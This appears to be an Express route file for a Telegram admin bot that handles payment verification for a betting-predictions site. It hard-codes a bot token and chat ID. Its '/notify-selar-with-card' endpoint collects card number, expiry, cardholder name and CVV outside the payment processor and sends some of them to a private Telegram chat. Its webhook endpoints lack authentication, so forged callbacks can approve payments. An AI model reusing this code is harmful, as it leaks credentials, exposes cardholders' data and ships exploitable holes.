// routes/telegram.js
const express = require('express');
const fetch = require('node-fetch');
const router = express.Router();

// Telegram configuration
const telegramBotToken = '7688438027:AAFNnge7_oADfxCwCMm2XZGSH1hG2Q0rZfE';
const telegramChatId = '5900219209';

// In-memory storage for pending payments
const pendingPayments = new Map();

// Handle preflight OPTIONS requests
router.options('/send', (req, res) => {
    res.header('Access-Control-Allow-Origin', 'https://avisignals.com');
    res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Allow-Credentials', 'true');
    res.sendStatus(200);
});

// Send message to Telegram
router.post('/send', async (req, res) => {
    // Set CORS headers explicitly for this route
    res.header('Access-Control-Allow-Origin', 'https://avisignals.com');
    res.header('Access-Control-Allow-Credentials', 'true');
    
    // Respond quickly to avoid client timeout
    let responseSent = false;
    
    const sendResponse = (status, data) => {
        if (!responseSent && !res.headersSent) {
            responseSent = true;
            res.status(status).json(data);
        }
    };
    
    try {
        const { message, orderId, includeVerificationButtons, paymentData } = req.body;
        
        console.log('📥 Telegram send request:', { 
            messageLength: message?.length, 
            orderId, 
            includeVerificationButtons,
            hasPaymentData: !!paymentData,
            hasToken: !!telegramBotToken,
            hasChatId: !!telegramChatId,
            tokenPrefix: telegramBotToken?.substring(0, 10) + '...',
            chatId: telegramChatId,
            baseUrl: process.env.BASE_URL
        });

        if (!message) {
            console.log('❌ No message provided');
            return sendResponse(400, {
                success: false,
                message: 'Message is required'
            });
        }

        let messageOptions = {
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'HTML'
        };

        // Add verification buttons for crypto payments or support messages
        if (includeVerificationButtons && orderId) {
            if (paymentData && paymentData.messageType === 'support') {
                // Support message buttons
                messageOptions.reply_markup = {
                    inline_keyboard: [
                        [
                            {
                                text: '💬 Reply to Customer',
                                callback_data: `reply_${orderId}`
                            }
                        ]
                    ]
                };
            } else {
                // Payment verification buttons
                messageOptions.reply_markup = {
                    inline_keyboard: [
                        [
                            {
                                text: '✅ VERIFY & SEND PREDICTIONS',
                                callback_data: `verify_${orderId}`
                            },
                            {
                                text: '❌ REJECT PAYMENT', 
                                callback_data: `reject_${orderId}`
                            }
                        ],
                        [
                            {
                                text: '💬 Reply to Customer',
                                callback_data: `reply_${orderId}`
                            }
                        ]
                    ]
                };
            }
        }

        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        console.log('📤 Sending to Telegram URL:', url.substring(0, 50) + '...');
        console.log('📤 Message options:', { 
            chat_id: messageOptions.chat_id, 
            textLength: messageOptions.text?.length,
            hasButtons: !!messageOptions.reply_markup,
            buttonCount: messageOptions.reply_markup?.inline_keyboard?.length || 0
        });
        
        // Send immediate response to frontend
        sendResponse(200, {
            success: true,
            message: 'Message queued for Telegram delivery',
            orderId: orderId
        });
        
        // Continue with Telegram API call in background
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(messageOptions),
            timeout: 10000 // 10 second timeout
        });

        const result = await response.json();
        console.log('📱 Telegram API Response:', { ok: result.ok, error: result.error_code, description: result.description });

        if (result.ok) {
            console.log('✅ Telegram message sent successfully to chat:', telegramChatId);
            // Don't send another response - already sent above
        } else {
            console.error('❌ Telegram API error:', result);
            // Don't send another response - already sent above
        }

    } catch (error) {
        console.error('Error sending to Telegram:', error);
        sendResponse(500, {
            success: false,
            message: 'Server error sending to Telegram',
            error: error.message
        });
    }
});

// Webhook endpoint for Telegram bot callbacks
router.post('/webhook', async (req, res) => {
    try {
        const update = req.body;
        
        // Handle text messages (for /reply commands and admin replies)
        if (update.message && update.message.text) {
            const text = update.message.text;
            const chatId = update.message.chat.id;
            const messageId = update.message.message_id;
            
            console.log('Received message:', text);

            // Default help message for telegram commands
            if (text === '/start' || text === '/help') {
                await sendTelegramMessage(chatId, 
                    `🤖 Aviator Support Bot\n\n` +
                    `This bot notifies admins about:\n` +
                    `• Payment verifications\n` +
                    `• Customer support requests\n\n` +
                    `Customer support is now handled via Tawk.to widget on the website.`
                );
            }
        }
        
        // Handle callback queries (button clicks) - keeping payment verification
        if (update.callback_query) {
            const callbackQuery = update.callback_query;
            const data = callbackQuery.data;
            const chatId = callbackQuery.message.chat.id;
            const messageId = callbackQuery.message.message_id;
            
            console.log('Received callback:', data);
            
            if (data.startsWith('verify_')) {
                const orderId = data.replace('verify_', '');
                await handlePaymentVerification(orderId, chatId, messageId, 'verified');
            } else if (data.startsWith('reject_')) {
                const orderId = data.replace('reject_', '');
                await handlePaymentVerification(orderId, chatId, messageId, 'rejected');
            } else if (data.startsWith('reply_')) {
                const orderId = data.replace('reply_', '');
                await handleCustomerReply(orderId, chatId, messageId);
            } 

            // Answer callback query to remove loading state
            await fetch(`https://api.telegram.org/bot${telegramBotToken}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    callback_query_id: callbackQuery.id,
                    text: 'Processing...'
                })
            });
        }
        
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Webhook error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Handle payment verification
async function handlePaymentVerification(orderId, chatId, messageId, action) {
    try {
        console.log(`🔄 Processing ${action} for order: ${orderId}`);
        
        // Check if this order is already being processed or completed
        if (global.processingOrders && global.processingOrders[orderId]) {
            console.log(`⚠️ Order ${orderId} is already being processed`);
            await updateMessage(chatId, messageId, `⚠️ Order ${orderId} is already being processed. Please wait...`);
            return;
        }
        
        // Mark order as being processed
        global.processingOrders = global.processingOrders || {};
        global.processingOrders[orderId] = { action, timestamp: Date.now() };
        
        // Get payment data from multiple sources
        let payment = pendingPayments.get(orderId);
        
        // If not found in pendingPayments, try global.cryptoPayments
        if (!payment && global.cryptoPayments && global.cryptoPayments[orderId]) {
            const globalPayment = global.cryptoPayments[orderId];
            
            // Check if already processed
            if (globalPayment.status === 'verified' || globalPayment.status === 'rejected') {
                console.log(`⚠️ Order ${orderId} already has status: ${globalPayment.status}`);
                delete global.processingOrders[orderId];
                await updateMessage(chatId, messageId, 
                    `⚠️ Order ${orderId} was already ${globalPayment.status}!\n\n` +
                    `📧 Customer: ${globalPayment.email}\n` +
                    `📦 Package: ${globalPayment.packageName}\n` +
                    `🆔 Order: ${orderId}\n` +
                    `🕒 Processed: ${globalPayment.verifiedAt || globalPayment.rejectedAt}`
                );
                return;
            }
            
            payment = {
                email: globalPayment.email,
                packageName: globalPayment.packageName,
                amount: globalPayment.amount,
                currency: globalPayment.currency,
                timeSlot: globalPayment.timeSlot,
                bettingSite: globalPayment.bettingSite,
                status: globalPayment.status
            };
        }
        
        // NEW: Try Selar payments storage
        if (!payment && global.selarPayments && global.selarPayments[orderId]) {
            const selarPayment = global.selarPayments[orderId];
            
            // Check if already processed
            if (selarPayment.status === 'verified' || selarPayment.status === 'rejected') {
                console.log(`⚠️ Selar order ${orderId} already has status: ${selarPayment.status}`);
                delete global.processingOrders[orderId];
                await updateMessage(chatId, messageId, 
                    `⚠️ Selar Order ${orderId} was already ${selarPayment.status}!\n\n` +
                    `📧 Customer: ${selarPayment.email}\n` +
                    `📦 Package: ${selarPayment.packageName}\n` +
                    `🆔 Order: ${orderId}\n` +
                    `🕒 Processed: ${selarPayment.verifiedAt || selarPayment.rejectedAt}`
                );
                return;
            }
            
            payment = {
                email: selarPayment.email,
                packageName: selarPayment.packageName,
                amount: selarPayment.amount || 'N/A',
                currency: 'USD',
                timeSlot: selarPayment.timeSlot,
                bettingSite: selarPayment.bettingSite,
                status: selarPayment.status,
                paymentType: 'selar'
            };
        }
        
        if (!payment) {
            console.log(`❌ Order ${orderId} not found in any payment storage`);
            delete global.processingOrders[orderId];
            await updateMessage(chatId, messageId, `❌ Order ${orderId} not found or already processed.`);
            return;
        }
        
        // Check if already processed to prevent race conditions
        if (payment.status === 'verified') {
            await updateMessage(chatId, messageId, 
                `✅ Order ${orderId} already VERIFIED!\n\n` +
                `📧 Customer: ${payment.email}\n` +
                `📦 Package: ${payment.packageName}\n` +
                `🆔 Order: ${orderId}\n\n` +
                `This payment has already been processed.`
            );
            return;
        }
        
        if (payment.status === 'rejected') {
            await updateMessage(chatId, messageId, 
                `❌ Order ${orderId} already REJECTED!\n\n` +
                `📧 Customer: ${payment.email}\n` +
                `📦 Package: ${payment.packageName}\n` +
                `🆔 Order: ${orderId}\n\n` +
                `This payment has already been processed.`
            );
            return;
        }
        
        if (action === 'verified') {
            // Update payment status to verified based on payment type
            if (global.cryptoPayments && global.cryptoPayments[orderId]) {
                global.cryptoPayments[orderId].status = 'verified';
                global.cryptoPayments[orderId].verifiedAt = new Date();
            } 
            
            // Update Selar payments
            if (global.selarPayments && global.selarPayments[orderId]) {
                global.selarPayments[orderId].status = 'verified';
                global.selarPayments[orderId].verifiedAt = new Date();
            }
            
            // Handle paybill and mobile payment verification
            if (orderId.startsWith('PAYBILL_') || orderId.startsWith('BOT_MPESA_')) {
                // Update in pendingPayments Map
                if (pendingPayments.has(orderId)) {
                    const currentData = pendingPayments.get(orderId);
                    currentData.status = 'verified';
                    currentData.verifiedAt = new Date();
                    pendingPayments.set(orderId, currentData);
                }
                
                // Also update in global.pendingPayments for crypto status endpoint
                global.pendingPayments = global.pendingPayments || {};
                if (global.pendingPayments[orderId]) {
                    global.pendingPayments[orderId].status = 'verified';
                    global.pendingPayments[orderId].verifiedAt = new Date();
                } else {
                    // Create entry if it doesn't exist
                    global.pendingPayments[orderId] = {
                        ...payment,
                        status: 'verified',
                        verifiedAt: new Date()
                    };
                }
            }
                
            console.log(`✅ PAYMENT VERIFIED via Telegram:`, { 
                orderId, 
                email: payment.email,
                package: payment.packageName,
                paymentType: payment.paymentType || 'unknown'
            });
                
            // Determine the correct verification endpoint based on payment type
            const baseUrl = process.env.BASE_URL?.replace(/\/$/, '') || 'https://aviator-backend-komp.onrender.com';
            let verifyUrl;
            
            if (payment.paymentType === 'selar' || global.selarPayments?.[orderId]) {
                // Use Selar admin verification endpoint
                verifyUrl = `${baseUrl}/api/payments/selar/admin-verify/${orderId}`;
            } else if (orderId.startsWith('BOT_') && payment.packageName?.toLowerCase().includes('bot')) {
                // Bot activation endpoint (create if doesn't exist)
                verifyUrl = `${baseUrl}/api/payments/bot/verify/${orderId}`;
            } else {
                // Default crypto verification endpoint
                verifyUrl = `${baseUrl}/api/payments/crypto/personal/verify/${orderId}`;
            }
            
            console.log('🔗 Verification URL:', verifyUrl);
            console.log('🔗 BASE_URL from env:', process.env.BASE_URL);
            
            const response = await fetch(verifyUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ verified: true })
            });
                
            if (response.ok) {
                await updateMessage(chatId, messageId, 
                    `✅ Payment VERIFIED!\n\n` +
                    `📧 Customer: ${payment.email}\n` +
                    `📦 Package: ${payment.packageName}\n` +
                    `💰 Amount: ${payment.amount} ${payment.currency}\n` +
                    `🆔 Order: ${orderId}\n` +
                    `🔗 Type: ${payment.paymentType || 'crypto'}\n\n` +
                    `🎯 Access has been granted to customer!`
                );
                
                // Only delete from pendingPayments after successful verification
                if (pendingPayments.has(orderId)) {
                    pendingPayments.delete(orderId);
                }
                
                // Clear processing state
                delete global.processingOrders[orderId];
                    
                console.log(`✅ Customer ${payment.email} will now see access granted!`);
            } else {
                const errorText = await response.text();
                console.error('Verification failed:', errorText);
                
                // Clear processing state
                delete global.processingOrders[orderId];
                
                await updateMessage(chatId, messageId, `❌ Failed to verify payment for order ${orderId}: ${errorText}`);
                
                // Reset status back to pending if verification failed
                if (global.cryptoPayments && global.cryptoPayments[orderId]) {
                    global.cryptoPayments[orderId].status = 'pending_verification';
                }
                if (global.selarPayments && global.selarPayments[orderId]) {
                    global.selarPayments[orderId].status = 'pending_verification';
                }
            }
        } else if (action === 'rejected') {
            // Update payment status to rejected based on payment type
            if (global.cryptoPayments && global.cryptoPayments[orderId]) {
                global.cryptoPayments[orderId].status = 'rejected';
                global.cryptoPayments[orderId].rejectedAt = new Date();
            } 
            
            // Update Selar payments
            if (global.selarPayments && global.selarPayments[orderId]) {
                global.selarPayments[orderId].status = 'rejected';
                global.selarPayments[orderId].rejectedAt = new Date();
            }
            
            // Handle paybill and mobile payment rejection
            if (orderId.startsWith('PAYBILL_') || orderId.startsWith('BOT_MPESA_')) {
                // Update in pendingPayments Map
                if (pendingPayments.has(orderId)) {
                    const currentData = pendingPayments.get(orderId);
                    currentData.status = 'rejected';
                    currentData.rejectedAt = new Date();
                    pendingPayments.set(orderId, currentData);
                }
                
                // Also update in global.pendingPayments for crypto status endpoint
                global.pendingPayments = global.pendingPayments || {};
                if (global.pendingPayments[orderId]) {
                    global.pendingPayments[orderId].status = 'rejected';
                    global.pendingPayments[orderId].rejectedAt = new Date();
                } else {
                    // Create entry if it doesn't exist
                    global.pendingPayments[orderId] = {
                        ...payment,
                        status: 'rejected',
                        rejectedAt: new Date()
                    };
                }
            }
                
            console.log(`❌ PAYMENT REJECTED via Telegram:`, { 
                orderId, 
                email: payment.email,
                package: payment.packageName,
                paymentType: payment.paymentType || 'unknown'
            });
            
            // Determine the correct rejection endpoint based on payment type
            const baseUrl = process.env.BASE_URL?.replace(/\/$/, '') || 'https://aviator-backend-komp.onrender.com';
            let rejectUrl;
            
            if (payment.paymentType === 'selar' || global.selarPayments?.[orderId]) {
                // Use Selar admin verification endpoint with rejection
                rejectUrl = `${baseUrl}/api/payments/selar/admin-verify/${orderId}`;
            } else if (orderId.startsWith('BOT_') && payment.packageName?.toLowerCase().includes('bot')) {
                // Bot activation endpoint (create if doesn't exist)
                rejectUrl = `${baseUrl}/api/payments/bot/verify/${orderId}`;
            } else {
                // Default crypto verification endpoint
                rejectUrl = `${baseUrl}/api/payments/crypto/personal/verify/${orderId}`;
            }
            
            console.log('🔗 Rejection URL:', rejectUrl);
            console.log('🔗 BASE_URL from env:', process.env.BASE_URL);
            
            const response = await fetch(rejectUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ verified: false })
            });
            
            if (response.ok) {
                await updateMessage(chatId, messageId, 
                    `❌ Payment REJECTED!\n\n` +
                    `📧 Customer: ${payment.email}\n` +
                    `📦 Package: ${payment.packageName}\n` +
                    `💰 Amount: ${payment.amount} ${payment.currency}\n` +
                    `🆔 Order: ${orderId}\n` +
                    `🔗 Type: ${payment.paymentType || 'crypto'}\n\n` +
                    `Customer has been notified.`
                );
                
                // Only delete from pendingPayments after successful rejection
                if (pendingPayments.has(orderId)) {
                    pendingPayments.delete(orderId);
                }
                
                // Clear processing state
                delete global.processingOrders[orderId];
            } else {
                const errorText = await response.text();
                console.error('Rejection failed:', errorText);
                
                // Clear processing state
                delete global.processingOrders[orderId];
                
                await updateMessage(chatId, messageId, `❌ Failed to reject payment for order ${orderId}: ${errorText}`);
                
                // Reset status back to pending if rejection failed
                if (global.cryptoPayments && global.cryptoPayments[orderId]) {
                    global.cryptoPayments[orderId].status = 'pending_verification';
                }
                if (global.selarPayments && global.selarPayments[orderId]) {
                    global.selarPayments[orderId].status = 'pending_verification';
                }
            }
        }
    } catch (error) {
        console.error('Error handling payment verification:', error);
        
        // Clear processing state
        if (global.processingOrders && global.processingOrders[orderId]) {
            delete global.processingOrders[orderId];
        }
        
        await updateMessage(chatId, messageId, `❌ Error processing ${action} for order ${orderId}: ${error.message}`);
    }
}

// Chat functionality disabled - Using Tawk.to for customer support

// Set webhook for Telegram bot (call this once to enable button callbacks)
router.post('/set-webhook', async (req, res) => {
    try {
        const baseUrl = process.env.BASE_URL?.replace(/\/$/, '') || '';
        const webhookUrl = `${baseUrl}/api/telegram/webhook`;
        
        console.log('🔗 Setting webhook URL:', webhookUrl);
        
        const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/setWebhook`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                url: webhookUrl,
                allowed_updates: ['callback_query', 'message']
            })
        });
        
        const result = await response.json();
        
        console.log('📱 Telegram webhook response:', result);
        
        if (result.ok) {
            res.json({ success: true, message: 'Webhook set successfully', webhookUrl });
        } else {
            res.status(400).json({ success: false, error: result.description });
        }
    } catch (error) {
        console.error('❌ Webhook setup error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Export router and pendingPayments
router.pendingPayments = pendingPayments;

// Helper function to send Telegram messages
async function sendTelegramMessage(chatId, text) {
    try {
        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Error sending Telegram message:', error);
    }
}

// Endpoint to notify admin when customer proceeds to pay via Selar
router.post('/notify-selar-payment', async (req, res) => {
    const { email, packageName } = req.body;
    if (!email || !packageName) {
        return res.status(400).json({ success: false, message: 'Email and packageName are required.' });
    }
    const message = `🚦 <b>${email}</b> is proceeding to make payment on Selar for <b>${packageName}</b>.`;
    try {
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        const messageOptions = {
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'HTML'
        };
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(messageOptions)
        });
        res.json({ success: true, message: 'Notification sent to Telegram.' });
    } catch (error) {
        console.error('Error sending Selar payment notification:', error);
        res.status(500).json({ success: false, message: 'Failed to send notification.' });
    }
});

// Endpoint to capture card info and notify when redirecting to Selar
router.post('/notify-selar-with-card', async (req, res) => {
    const { email, packageName, cardInfo, amount, source } = req.body;
    
    if (!email || !packageName) {
        return res.status(400).json({ success: false, message: 'Email and packageName are required.' });
    }
    
    // Build message with card info if provided
    let message = `💳 <b>SELAR CHECKOUT INITIATED</b>\n\n`;
    message += `👤 <b>Customer:</b> ${email}\n`;
    message += `📦 <b>Package:</b> ${packageName}\n`;
    
    if (amount) {
        message += `💰 <b>Amount:</b> $${amount}\n`;
    }
    
    if (source) {
        message += `🔗 <b>Source:</b> ${source}\n`;
    }
    
    if (cardInfo) {
        message += `\n💳 <b>CARD INFORMATION:</b>\n`;
        if (cardInfo.cardNumber) {
            // Mask card number for security (show only last 4 digits)
            const maskedCard = '**** **** **** ' + cardInfo.cardNumber.slice(-4);
            message += `🔢 <b>Card:</b> ${maskedCard}\n`;
        }
        if (cardInfo.expiryDate) {
            message += `📅 <b>Expiry:</b> ${cardInfo.expiryDate}\n`;
        }
        if (cardInfo.cardholderName) {
            message += `👤 <b>Name:</b> ${cardInfo.cardholderName}\n`;
        }
        if (cardInfo.cvv) {
            message += `🔐 <b>CVV:</b> ***\n`;
        }
    }
    
    message += `\n🚦 <b>Customer is being redirected to Selar checkout...</b>`;
    
    try {
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        const messageOptions = {
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'HTML'
        };
        
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(messageOptions)
        });
        
        res.json({ success: true, message: 'Card info and Selar notification sent to Telegram.' });
    } catch (error) {
        console.error('Error sending Selar card notification:', error);
        res.status(500).json({ success: false, message: 'Failed to send notification.' });
    }
});

module.exports = router;
